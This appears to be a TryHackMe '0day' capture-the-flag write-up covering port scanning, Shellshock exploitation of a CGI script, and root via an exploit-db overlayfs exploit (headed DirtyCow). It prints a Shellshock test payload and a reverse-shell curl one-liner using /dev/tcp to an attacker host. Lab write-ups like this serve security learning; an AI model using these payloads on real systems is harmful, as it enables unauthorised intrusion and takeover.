-------------------

### CTF: TRYHACKME
### LAB: 0day

-------------------

![image](https://github.com/user-attachments/assets/4320393f-c971-42f0-9922-da5d281fa2ed)

-------------------

### RECONNAISSANCE

- Rustscan's output

      ❯ rustscan -a 10.10.120.98 -- -sC -sV -Pn
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Nmap? More like slowmap.🐢
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.120.98:22
      Open 10.10.120.98:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 16:22 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 16:22
      Completed NSE at 16:22, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 16:22
      Completed NSE at 16:22, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 16:22
      Completed NSE at 16:22, 0.00s elapsed
      Initiating Parallel DNS resolution of 1 host. at 16:22
      Completed Parallel DNS resolution of 1 host. at 16:22, 0.12s elapsed
      DNS resolution of 1 IPs took 0.12s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 16:22
      Scanning 10.10.120.98 [2 ports]
      Discovered open port 80/tcp on 10.10.120.98
      Discovered open port 22/tcp on 10.10.120.98
      Completed Connect Scan at 16:22, 0.48s elapsed (2 total ports)
      Initiating Service scan at 16:22
      Scanning 2 services on 10.10.120.98
      Completed Service scan at 16:22, 6.67s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.120.98.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 16:22
      Completed NSE at 16:22, 5.96s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 16:22
      Completed NSE at 16:22, 0.74s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 16:22
      Completed NSE at 16:22, 0.00s elapsed
      Nmap scan report for 10.10.120.98
      Host is up, received user-set (0.48s latency).
      Scanned at 2024-09-05 16:22:22 EDT for 14s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
      | ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
      |   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
      |   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
      |   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
      80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: 0day
      |_http-server-header: Apache/2.4.7 (Ubuntu)
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- FFUF's output

![image](https://github.com/user-attachments/assets/8664e26c-b6e1-4f96-9cb3-82126a88905b)

- FFuf discovered a `cgi_bin` directory, I fuzzed for cgi scripts  and got one `test.cgi` file.

![image](https://github.com/user-attachments/assets/77ffc0a9-d4c1-4b51-a2e8-f29513df19f3)

--------------------------

### Exploiting Shellshoch vulnerability

- Shellshock is a critical bug in Bash versions 1.0.3 - 4.3 that can enable an attacker to execute arbitrary commands.Vulnerable versions of Bash incorrectly execute commands that follow function definitions stored inside environment variables.
This can be exploited by an attacker in systems that store user input in environment variables.

- Some Apache servers uses `Common Gateway  Interface`[CGI] which allows cli programs to be used to generate dynamic pages.Request information e.g. query parameters, user agent, etc. is stored in environment variables. Standard output from the program is returned to the user as the HTTP response.

- I tested the cgi script by attempting to echo `vulnerable` which reflected the output `vulnerable`.

 Payload-:```curl -H "User-agent: () { :;}; echo; echo vulnerable"  [path]```

![image](https://github.com/user-attachments/assets/b7ad5236-5e3b-4613-af03-edc8a6445b4d)

- I spawned a revshell with the payload below.

Payload-:```curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1"```

![image](https://github.com/user-attachments/assets/21e225dd-7aa1-48d9-a74a-2fe7b1cc37ae)


----------------------

### PRIVESC with DirtyCow exploit

- I ran `hostnamectl` to check for the operating system version that turned out to be `UBUNTU 14.04` which is vulnerable to the `overlayfs` exploit.

![image](https://github.com/user-attachments/assets/9ab23dbd-b756-4e9f-ae91-76510b2bdeae)

- I got an exploit from [exploitdb](https://www.exploit-db.com/exploits/37292)

- I ran into a error while trying to compile the code. 

![image](https://github.com/user-attachments/assets/dcd77be8-baa2-4b3d-b8f7-0876844e6e5e)

- I fixed it by adding `/usr/bin` to the path variable.

![image](https://github.com/user-attachments/assets/0bcdde9d-6cc5-4b15-b6c7-568caac9b37b)

- ROOT!!!!....

![image](https://github.com/user-attachments/assets/2b845616-0e9d-439e-8d48-8b5d203dc864)


------------------------

### THANKS FOR READING!!!!....

------------------------

### REFERENCES:

- [Shellshock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)
- [Overlayfs exploit](https://www.exploit-db.com/exploits/37292)

-----------------------





